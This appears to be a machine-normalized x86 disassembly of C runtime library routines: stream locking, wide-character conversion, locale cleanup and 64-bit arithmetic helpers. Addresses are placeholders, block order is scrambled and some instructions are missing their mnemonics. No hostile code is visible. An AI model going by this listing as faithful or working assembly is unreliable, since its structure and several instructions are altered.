mov [ rw-data ] esi
call sub_41aa23
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_42120b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_419057
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_42124c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_419057
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_42127e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_418f7d
pop ecx
pop ebp
retn
sub_4212ba
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_418f7d
pop ecx
pop ebp
retn
sub_4212e9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_4162ac
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_4153b1
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_42131b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_4212e9
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_422cb7
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_4212e9
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
push esi
call sub_4212e9
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_4212e9
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_4212e9
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_4212e9
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_4212e9
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_4212e9
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_4212e9
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_4212e9
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_421df0
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_4212e9
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_4212e9
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_41c4ef
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_4214b8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_41c653
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_4215e9
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_4162ac
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_4215e9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41c653
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_421640
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_42166d
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_41c653
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_4162ac
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_4215e9
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_42270a
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_4226c5
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_421782
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_42166d
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_4217ae
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_41c653
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_423b0d
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_423085
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
sub_421856
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_41c653
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_423b0d
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_4235c9
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
sub_4218fe
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ecx + 0xc ]
cmp esi ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_4162ac
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_4162ac
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4153b1
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_418e20
inc eax
push eax
push edi
push esi
call sub_414a50
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_4219bd
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test ebx ebx
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_421a7a
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4219bd
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_424205
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_418db8
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_415289
add esp 0x14
sub_421b10
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_421bf0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_421c18
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
test ecx 0xfcf0fce0
je r-xdata
mov esi [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_424c57
call sub_424c57
mov [ esi ] eax
jmp r-xdata
call sub_4162ac
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_4153b1
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_424c57
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_421c84
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_41c653
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_4162ac
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_4153b1
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_4162ac
mov [ eax ] 0x2a
call sub_4162ac
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_4162ac
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_4153b1
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_415f60
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_415f60
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_421e23
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_415093
push [ esi + 0x8 ]
call sub_415093
push [ esi + 0xc ]
call sub_415093
push [ esi + 0x10 ]
call sub_415093
push [ esi + 0x14 ]
call sub_415093
push [ esi + 0x18 ]
call sub_415093
push [ esi ]
call sub_415093
push [ esi + 0x20 ]
call sub_415093
push [ esi + 0x24 ]
call sub_415093
push [ esi + 0x28 ]
call sub_415093
push [ esi + 0x2c ]
call sub_415093
push [ esi + 0x30 ]
call sub_415093
push [ esi + 0x34 ]
call sub_415093
push [ esi + 0x1c ]
call sub_415093
push [ esi + 0x38 ]
call sub_415093
push [ esi + 0x3c ]
call sub_415093
add esp 0x40
push [ esi + 0x40 ]
call sub_415093
push [ esi + 0x44 ]
call sub_415093
push [ esi + 0x48 ]
call sub_415093
push [ esi + 0x4c ]
call sub_415093
push [ esi + 0x50 ]
call sub_415093
push [ esi + 0x54 ]
call sub_415093
push [ esi + 0x58 ]
call sub_415093
push [ esi + 0x5c ]
call sub_415093
push [ esi + 0x60 ]
call sub_415093
push [ esi + 0x64 ]
call sub_415093
push [ esi + 0x68 ]
call sub_415093
push [ esi + 0x6c ]
call sub_415093
push [ esi + 0x70 ]
call sub_415093
push [ esi + 0x74 ]
call sub_415093
push [ esi + 0x78 ]
call sub_415093
push [ esi + 0x7c ]
call sub_415093
add esp 0x40
push [ esi + 0x80 ]
call sub_415093
push [ esi + 0x84 ]
call sub_415093
push [ esi + 0x88 ]
call sub_415093
push [ esi + 0x8c ]
call sub_415093
push [ esi + 0x90 ]
call sub_415093
push [ esi + 0x94 ]
call sub_415093
push [ esi + 0x98 ]
call sub_415093
push [ esi + 0x9c ]
call sub_415093
push [ esi + 0xa0 ]
call sub_415093
push [ esi + 0xa4 ]
call sub_415093
push [ esi + 0xa8 ]
call sub_415093
add esp 0x2c
sub_421fb8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_415093
pop ecx
mov esi [ esi + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_415093
pop ecx
push esi
call sub_415093
pop ecx
sub_421ffd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_415093
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_415093
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_415093
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_415093
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_415093
pop ecx
mov esi [ esi + 0x24 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_415093
pop ecx
push esi
call sub_415093
pop ecx
sub_422090
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_4220d6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_424f66
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_414a33
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
